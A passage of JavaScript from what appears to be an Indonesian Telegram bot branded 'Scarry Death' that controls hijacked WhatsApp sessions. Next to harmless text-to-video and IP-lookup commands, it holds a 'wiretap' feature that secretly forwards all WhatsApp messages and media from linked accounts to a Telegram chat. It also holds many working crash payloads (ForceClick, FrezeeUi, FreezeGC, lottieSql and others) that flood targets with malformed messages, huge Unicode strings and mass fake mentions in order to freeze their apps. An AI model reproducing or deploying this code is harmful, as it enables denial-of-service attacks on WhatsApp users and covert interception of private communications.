        return bot.sendMessage(chatId, 'Masukkan prompt untuk membuat video!\nContoh: /' + command + ' A pixel-art queen in her throne room');
    }

    // Kirim pesan sedang memproses
    const processingMsg = await bot.sendMessage(chatId, '⏳ Sedang membuat video dari teks... Jangan berharap terlalu tinggi 😅');

    try {
        const prompt = text;
        const auth = 'eyJzdWIiwsdeOiIyMzQyZmczNHJ0MzR0weMzQiLCJuYW1lIjorwiSm9objMdf0NTM0NT';

        // Step 1: Request pembuatan video
        const { data: keyData } = await axios.post('https://soli.aritek.app/txt2videov3', {
            deviceID: Math.random().toString(16).substr(2, 8) + Math.random().toString(16).substr(2, 8),
            prompt: prompt,
            used: [],
            versionCode: 51
        }, {
            headers: {
                authorization: auth,
                'content-type': 'application/json; charset=utf-8',
                'accept-encoding': 'gzip',
                'user-agent': 'okhttp/4.11.0'
            }
        });

        // Step 2: Ambil video yang sudah dibuat
        const { data } = await axios.post('https://soli.aritek.app/video', {
            keys: [keyData.key]
        }, {
            headers: {
                authorization: auth,
                'content-type': 'application/json; charset=utf-8',
                'accept-encoding': 'gzip',
                'user-agent': 'okhttp/4.11.0'
            }
        });

        const videoUrl = data.datas[0]?.url;
        if (!videoUrl) {
            await bot.deleteMessage(chatId, processingMsg.message_id);
            return bot.sendMessage(chatId, '❌ Tidak ditemukan video.');
        }

        // Hapus pesan processing dan kirim video
        await bot.deleteMessage(chatId, processingMsg.message_id);
        
        await bot.sendVideo(chatId, videoUrl, {
            caption: `🎬 Hasil Text to Video:\n"${prompt}"`,
            reply_to_message_id: msg.message_id
        });

    } catch (error) {
        console.error('Error:', error);
        
        // Hapus pesan processing
        try {
            await bot.deleteMessage(chatId, processingMsg.message_id);
        } catch (deleteError) {
            console.error('Gagal menghapus pesan processing:', deleteError);
        }
        
        await bot.sendMessage(chatId, '❌ Gagal membuat video dari teks.', {
            reply_to_message_id: msg.message_id
        });
    }
});


async function uploadToCatbox(fileBuffer, filename) {
  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", new Blob([fileBuffer]), filename);

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: form,
  });

  const text = await res.text();
  if (!res.ok || text.startsWith("ERROR")) {
    throw new Error("Upload gagal: " + text);
  }
  return text.trim();
}


bot.onText(/^\/cekip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const ip = match[1]?.trim();
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/cekip')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

  // Validasi IP address
  if (!ip || !/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) {
    return bot.sendMessage(
      chatId,
      "❌ *IP tidak valid!*\n\nContoh penggunaan:\n`/cekip 8.8.8.8`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendChatAction(chatId, "typing");

    const res = await axios.get(`https://ipwho.is/${ip}`);
    const data = res.data;

    if (!data.success) {
      return bot.sendMessage(chatId, "❌ *IP tidak ditemukan atau tidak valid!*", {
        parse_mode: "Markdown",
      });
    }

    const {
      ip: ipAddress,
      continent,
      country,
      country_code,
      region,
      city,
      org,
      timezone,
      latitude,
      longitude,
    } = data;

    const gmapsUrl =
      latitude && longitude
        ? `🔗 *Google Maps:* [Klik di sini](https://maps.google.com/maps?q=${latitude},${longitude})`
        : "🔗 *Google Maps:* Tidak tersedia";

    const result = `📡 *IP WHOIS Lookup*
━━━━━━━━━━━━━━━━━━━━
🌐 *IP:* ${ipAddress}
🧭 *Continent:* ${continent || "-"}
🏳️ *Country:* ${country || "-"} (${country_code || "-"})
🏙️ *Region:* ${region || "-"}
📍 *City:* ${city || "-"}
🏢 *ISP:* ${org || "-"}
⏰ *Timezone:* ${timezone?.id || "-"}
📌 *Latitude:* ${latitude || "-"}
📌 *Longitude:* ${longitude || "-"}
${gmapsUrl}
━━━━━━━━━━━━━━━━━━━━`;

    return bot.sendMessage(chatId, result, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });

  } catch (err) {
    console.error("Error /cekip:", err.message || err);
    return bot.sendMessage(chatId, "❌ *Terjadi kesalahan saat mengambil data IP!*", {
      parse_mode: "Markdown",
    });
  }
});

// ============================================================================
// 📡 FITUR: MONITORING, KIRIM PESAN & STORY WHATSAPP (FULL MEDIA SUPPORT 2 ARAH)
// ============================================================================
const mime = require("mime-types");

// 🔧 Ambil konfigurasi
const { OWNER_ID, NOTIF_ID } = require("./config");

let waMonitoring = false;

// ============================================================================
// 🧩 CEK OWNER
// ============================================================================
function isOwner(userId) {
  return OWNER_ID.map(String).includes(String(userId));
}

function ownerOnly(bot, msg) {
  bot.sendMessage(msg.chat.id, "❌ Kamu *tidak memiliki izin*.", { parse_mode: "Markdown" });
}

// ============================================================================
// ⚙️ CONTROL MONITORING
// ============================================================================
bot.onText(/^\/wa_on$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  waMonitoring = true;
  bot.sendMessage(msg.chat.id, "✅ Sadap Whatsapp *aktif*.", { parse_mode: "Markdown" });
});

bot.onText(/^\/wa_off$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  waMonitoring = false;
  bot.sendMessage(msg.chat.id, "🚫 Sadap Whatsapp *dimatikan*.", { parse_mode: "Markdown" });
});

bot.onText(/^\/wa_status$/, (msg) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
  bot.sendMessage(
    msg.chat.id,
    `📋 Monitoring: *${waMonitoring ? "ON ✅" : "OFF ❌"}*`,
    { parse_mode: "Markdown" }
  );
});

// ============================================================================
// 👥 FITUR /LISTGROUP — Lihat daftar grup dari sesi aktif
// ============================================================================
bot.onText(/^\/listgroup (.+)$/, async (msg, match) => {
  if (!isOwner(msg.from.id)) return ownerOnly(bot, msg);
   
  const sessionNumber = match[1];
  const sock = sessions.get(sessionNumber);
  if (!sock)
    return bot.sendMessage(
      msg.chat.id,
      `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
      { parse_mode: "Markdown" }
    );

  try {
    const groups = await sock.groupFetchAllParticipating();
    let text = `📋 *Daftar Grup Sesi ${sessionNumber}:*\n\n`;
    let count = 0;

    for (const id in groups) {
      const g = groups[id];
      text += `🔹 *${g.subject}*\n🆔 ${id}\n\n`;
      count++;
    }

    if (count === 0) text = "❌ Tidak ada grup yang ditemukan.";
    bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
  }
});

// ============================================================================
// ✉️ FITUR /KIRIMPESAN
// ============================================================================
bot.on("message", async (msg) => {
  if (!isOwner(msg.from.id)) return;

  // ===== Command utama: /kirimpesan <session> <target> [pesan opsional] =====
  if (msg.text && msg.text.startsWith("/kirimpesan")) {
    const args = msg.text.trim().split(" ");
    if (args.length < 3)
      return bot.sendMessage(
        msg.chat.id,
        "⚠️ Format salah!\nGunakan: /kirimpesan <session> <target> <pesan opsional>"
      );
      
    const sessionNumber = args[1];
    const target = args[2];
    const messageText = args.slice(3).join(" ") || "";
    const sock = sessions.get(sessionNumber);

    if (!sock)
      return bot.sendMessage(
        msg.chat.id,
        `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
        { parse_mode: "Markdown" }
      );

    const jid = target.includes("@g.us") ? target : `${target}@s.whatsapp.net`;

    if (messageText) {
      try {
        await sock.sendMessage(jid, { text: messageText });
        bot.sendMessage(msg.chat.id, `✅ Pesan teks terkirim ke ${target}`);
      } catch (err) {
        console.error("Gagal kirim teks:", err);
        bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
      }
    } else {
      bot.sendMessage(
        msg.chat.id,
        "📩 Sekarang *reply pesanmu* untuk dikirim ke WhatsApp.",
        { parse_mode: "Markdown" }
      );
    }
  }

  // ===== Mode reply kirim media / teks =====
  if (msg.reply_to_message && msg.reply_to_message.text?.startsWith("/kirimpesan")) {
    const match = msg.reply_to_message.text.match(/^\/kirimpesan\s+(\S+)\s+(\S+)/);
    if (!match) return;

    const sessionNumber = match[1];
    const target = match[2];
    const sock = sessions.get(sessionNumber);
    if (!sock)
      return bot.sendMessage(msg.chat.id, `⚠️ Sesi *${sessionNumber}* tidak aktif.`, {
        parse_mode: "Markdown",
      });

    const jid = target.includes("@g.us") ? target : `${target}@s.whatsapp.net`;
    const caption = msg.caption || msg.text || "";

    try {
      const getFileBuffer = async (fileId) => {
        const link = await bot.getFileLink(fileId);
        const res = await axios.get(link, { responseType: "arraybuffer" });
        return Buffer.from(res.data);
      };

      if (msg.photo) {
        const buffer = await getFileBuffer(msg.photo.at(-1).file_id);
        await sock.sendMessage(jid, { image: buffer, caption });
      } else if (msg.video) {
        const buffer = await getFileBuffer(msg.video.file_id);
        await sock.sendMessage(jid, { video: buffer, caption });
      } else if (msg.document) {
        const buffer = await getFileBuffer(msg.document.file_id);
        await sock.sendMessage(jid, {
          document: buffer,
          fileName: msg.document.file_name || "file",
          caption,
        });
      } else if (msg.audio) {
        const buffer = await getFileBuffer(msg.audio.file_id);
        await sock.sendMessage(jid, { audio: buffer, mimetype: "audio/mpeg" });
      } else if (msg.voice) {
        const buffer = await getFileBuffer(msg.voice.file_id);
        await sock.sendMessage(jid, { audio: buffer, ptt: true });
      } else if (msg.sticker) {
        const buffer = await getFileBuffer(msg.sticker.file_id);
        await sock.sendMessage(jid, { sticker: buffer });
      } else if (msg.text) {
        await sock.sendMessage(jid, { text: caption });
      } else {
        return bot.sendMessage(msg.chat.id, "⚠️ Jenis pesan ini belum bisa dikirim.");
      }

      bot.sendMessage(msg.chat.id, `✅ Pesan berhasil dikirim ke ${target}`);
    } catch (err) {
      console.error("Gagal kirim media:", err);
      bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
    }
  }

  // ======================================================================
  // 🕹 FITUR /addstory <session> [teks opsional]
  // ======================================================================
  if (msg.text && msg.text.startsWith("/addstory")) {
    const args = msg.text.trim().split(" ");
    if (args.length < 2)
      return bot.sendMessage(
        msg.chat.id,
        "⚠️ Format salah!\nGunakan: /addstory <session> <teks opsional>"
      );

    const sessionNumber = args[1];
    const storyText = args.slice(2).join(" ") || "";
    const sock = sessions.get(sessionNumber);

    if (!sock)
      return bot.sendMessage(
        msg.chat.id,
        `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
        { parse_mode: "Markdown" }
      );

    if (storyText) {
      try {
        await sock.sendMessage("status@broadcast", { text: storyText });
        bot.sendMessage(msg.chat.id, "✅ Story teks berhasil dikirim!");
      } catch (err) {
        console.error("Gagal kirim story teks:", err);
        bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
      }
    } else {
      bot.sendMessage(
        msg.chat.id,
        "📸 Sekarang *reply pesan (foto/video + caption opsional)* untuk dijadikan story WhatsApp.",
        { parse_mode: "Markdown" }
      );
    }
  }

  // Mode reply media story
  if (msg.reply_to_message && msg.reply_to_message.text?.startsWith("/addstory")) {
    const match = msg.reply_to_message.text.match(/^\/addstory\s+(\S+)/);
    if (!match) return;

    const sessionNumber = match[1];
    const sock = sessions.get(sessionNumber);
    if (!sock) return bot.sendMessage(msg.chat.id, "⚠️ Sesi tidak aktif.");

    const caption = msg.caption || "";
    try {
      const getFileBuffer = async (fileId) => {
        const link = await bot.getFileLink(fileId);
        const res = await axios.get(link, { responseType: "arraybuffer" });
        return Buffer.from(res.data);
      };

      if (msg.photo) {
        const buffer = await getFileBuffer(msg.photo.at(-1).file_id);
        await sock.sendMessage("status@broadcast", { image: buffer, caption });
      } else if (msg.video) {
        const buffer = await getFileBuffer(msg.video.file_id);
        await sock.sendMessage("status@broadcast", { video: buffer, caption });
      } else {
        return bot.sendMessage(msg.chat.id, "⚠️ Kirim foto atau video untuk story.");
      }

      bot.sendMessage(msg.chat.id, "✅ Story berhasil diunggah!");
    } catch (err) {
      console.error("Gagal upload story:", err);
      bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
    }
  }
});

// ============================================================================
// 📬 FORWARD PESAN MASUK KE TELEGRAM
// ============================================================================
async function forwardToTelegram(
  type,
  fromNumber,
  messageContent,
  sessionNumber,
  mediaBuffer = null,
  mimeType = null,
  isGroup = false,
  groupName = null,
  groupId = null,
  senderName = null
) {
  try {
    if (!NOTIF_ID) return;

    let caption = "";
    if (isGroup) {
      caption = `👥 *Grup:* ${groupName}\n🆔 *ID Grup:* ${groupId}\n👤 *Pengirim:* ${senderName || fromNumber}`;
    } else if (type === "out") {
      caption = `📤 *${sessionNumber} → ${fromNumber}*`;
    } else {
      caption = `📥 *${fromNumber} → ${sessionNumber}*`;
    }

    if (messageContent) caption += `\n💬 ${messageContent}`;

    if (mediaBuffer && mimeType) {
      if (mimeType.startsWith("image/"))
        await bot.sendPhoto(NOTIF_ID, mediaBuffer, { caption, parse_mode: "Markdown" });
      else if (mimeType.startsWith("video/"))
        await bot.sendVideo(NOTIF_ID, mediaBuffer, { caption, parse_mode: "Markdown" });
      else if (mimeType.startsWith("audio/"))
        await bot.sendAudio(NOTIF_ID, mediaBuffer, { caption });
      else {
        const ext = mime.extension(mimeType) || "bin";
        await bot.sendDocument(NOTIF_ID, mediaBuffer, {}, { filename: `file.${ext}` });
      }
    } else {
      await bot.sendMessage(NOTIF_ID, caption, { parse_mode: "Markdown" });
    }
  } catch (err) {
    console.error("Gagal kirim notifikasi Telegram:", err.message);
  }
}

// ============================================================================
// 📨 HANDLER PESAN MASUK DARI WHATSAPP
// ============================================================================
function attachMessageHandler(sock, botNumber) {
  if (sock._handlerAttached) return;
  sock._handlerAttached = true;

  sock.ev.on("messages.upsert", async (m) => {
    if (!waMonitoring) return;
    try {
      const msg = m.messages[0];
      if (!msg.message) return;

      const from = msg.key.remoteJid;
      const fromMe = msg.key.fromMe;
      const isGroup = from.endsWith("@g.us");
      const type = Object.keys(msg.message)[0];

      let text =
        msg.message.conversation ||
        msg.message.extendedTextMessage?.text ||
        msg.message[type]?.caption ||
        "";

      let buffer = null, mimetype = null;

      if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(type)) {
        const stream = await downloadContentFromMessage(msg.message[type], type.replace("Message", ""));
        const chunks = [];
        for await (const c of stream) chunks.push(c);
        buffer = Buffer.concat(chunks);
        mimetype = msg.message[type].mimetype;
      }

      if (msg.message.call) text = "📞 *Panggilan Masuk*";

      if (isGroup) {
        const meta = await sock.groupMetadata(from);
        const sender = msg.key.participant?.split("@")[0];
        await forwardToTelegram(
          "in",
          sender,
          text,
          botNumber,
          buffer,
          mimetype,
          true,
          meta.subject,
          from,
          sender
        );
      } else {
        if (fromMe)
          await forwardToTelegram("out", from.split("@")[0], text, botNumber, buffer, mimetype);
        else
          await forwardToTelegram("in", from.split("@")[0], text, botNumber, buffer, mimetype);
      }
    } catch (err) {
      console.error("Error pesan WA:", err.message);
    }
  });
}

// ============================================================================
// 🔁 PASANG HANDLER UNTUK SEMUA SESSION
// ============================================================================
setInterval(() => {
  for (const [botNumber, sck] of sessions) {
    if (sck && !sck._handlerAttached) attachMessageHandler(sck, botNumber);
  }
}, 5000);


//---------------( FUNCTION ISI DISINI  )----------------\\
async function ForceClick(target) {
  try {
    const zieeMsg = {
      remoteJid: "X",
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: Math.floor(Math.random() * 3) + 1,
          expiryTimestamp: Date.now() + 1814400000
        }
      }
    }

    const duarr = {
      viewOnceMessageV2: {
        message: {
          extendedTextMessage: {
            text: "Sayang Masih Ingat Aku??",
            contextInfo: zieeMsg
          }
        }
      }
    }
    const msg1 = generateWAMessageFromContent(target, duarr, {})
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id })

    await new Promise(r => setTimeout(r, 300))

    const duarrrr = {
      templateMessage: {
        hydratedTemplate: {
          hydratedContentText: "‎",
          hydratedFooterText: " ",
          hydratedButtons: [
            { index: 1, urlButton: { displayText: "‎", url: "http://t.me/raraa_imuppp"+"...".repeat(500) } }
          ],
          contextInfo: {
            remoteJid: "X",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
    const msg2 = generateWAMessageFromContent(target, duarrrr, {})
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id })
  } catch (e) {}
}

async function LocX(target) {
  const LocaX = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(150),
          address: "ꦽ".repeat(100),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: target
  });
}

async function locaX(target) {
  const LocaX = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(150),
          address: "ꦽ".repeat(100),
          contetargettInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: target
  });
}
async function locaXx(target) {
  const Locx = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(15000),
          address: "ꦽ".repeat(10000),
          contetargettInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", Locx, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: target
  });
}

async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "ીꦽ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteEtargetpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sock.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

async function LocationUi(target) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝟏𝟖 𝐆𝐄𝐍 𝟏" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function FrezeeUi(target) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝟏𝟖 𝐆𝐄𝐍 𝟏" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "sock - Scarry",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function Frezeblank(target) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝟏𝟖 𝐆𝐄𝐍 𝟏" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function LocationFreze(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝟏𝟖 𝐆𝐄𝐍 𝟏" + "ꦾ".repeat(45000),
                address: "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝟏𝟖 𝐆𝐄𝐍 𝟏"
              },
            },
            body: {
              text: "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝟏𝟖 𝐆𝐄𝐍 𝟏" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function xetxaip(target) {
  const xetxa = "\u0010";
  const xetxaPy = "𑇂𑆵𑆴𑆿𑆿".repeat(15000);
  const kontol = "𑇂𑆵𑆴𑆿".repeat(25000);

  let message = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          jpegThumbnail: null,
          name: xetxa + xetxaPy,
          address: xetxa + xetxaPy,
          url: `https://xetxa.com + ${kontol}`,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined,
        }],
      }],
    }],
  });
}

async function FreezeGC(groupJid, jids = false) {
      var messageContent = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
             'viewOnceMessage': {
                    'message': {
                           "newsletterAdminInviteMessage": {
                                  "newsletterJid": `120363298524333143@newsletter`,
                                  "newsletterName": "𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝟏𝟖 𝐆𝐄𝐍 𝟏" + "18".repeat(60000) + "\u0000".repeat(920000),
                                  "jpegThumbnail": "",
                                  "caption": `Scarry Death`,
                                  "inviteExpiration": Date.now() + 1814400000
                           }
                    }
             }
      }), {
             'userJid': groupJid
      });
      await sock.relayMessage(groupJid, messageContent.message, jids ? {
             'participant': { 
                   'jid': groupJid
             }
      } : {});
}

async function lottieSql(target) {
  const lottieMsg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Hu97Uc0XAUv82l507qXZfYF6dlrIB0/GKdB/nRvYpZw=",
            fileEncSha256: "YxrC0SoMBHP3msQt7SBUQepYDHH+l+PXfp1Nam7OhXo=",
            mediaKey: "Pbjsi5FmJ6PaTIHxd3MHS/i6WN/PKDHjFv/jbuaKM28=",
            mimetype: "application/was",
            height: 9999,
            width: 9999,
            directPath: "/v/t62.15575-24/531060561_777860237969584_3957290612626270602_n.enc?ccb=11-4&oh=01_Q5Aa2QGtB4SUG4l9yG5qRj9bMU7v1XGepksJJ82cpY9eUJIngQ&oe=68C2923B&_nc_sid=5e03e0",
            fileLength: "10737418240000",
            mediaKeyTimestamp: "1755002437",
            isAnimated: true,
            stickerSentTs: "1755002439632",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              statusAttributionType: 2,
              forwardingScore: 8888,
              isForwarded: true,
              remoteJid: "X",
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 1999 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e+21 * 999999999999999999999999999999999999999999999999999999999e+21 * Date.now()
                }
              },
            }
          }
        }
      }
    }),
    { participant: { jid: target } }
  );

  await sock.relayMessage(target, lottieMsg.message, {
    participant: { 
      jid: target 
    }, 
    messageId: lottieMsg.key.id, 
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "call_permission_request"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
  
 await sock.sendNode({
   tag: "message",
    attrs: {
      id: crypto.randomBytes(32),
      to: "@s.whatsapp.net",
      type: "media",
    },
    content: [
      {
        tag: "status",
        attrs: {},
        content: null,
      },
    ],
  }); 
}

async function fcinfinityori(target) {
  const pnxMsg = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "‼️⃟ ༚ ./𝕾𝖈𝖆𝖗𝖗𝖞𝕯𝖊𝖆𝖙𝖍.     ",
        matchedText: "https://Wa.me/stickerpack/AllTheFeels",
        description: "𑇂𑆵𑆴𑆿".repeat(20000),
        title: "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, pnxMsg.message, {
    messageId: pnxMsg.key.id,
  });  
  await sock.sendMessage(target, {
    text: "‼️⃟ ༚ ./𝕾𝖈𝖆𝖗𝖗𝖞𝕯𝖊𝖆𝖙𝖍.     " + "𑇂𑆵𑆴𑆿".repeat(12000),
    contextInfo: {
      externalAdReply: {
        title: "𑇂𑆵𑆴𑆿".repeat(15000),
        body: "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "PHOTO",
        remoteJid: " X ",
        conversionSource: " X ",
        conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
        conversionDelaySeconds: 10,
        forwardingScore: 999,
        isForwarded: true,
        quotedAd: {
          advertiserName: " X ",
          mediaType: "IMAGE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
          caption: " X "
        },
        placeholderKey: {
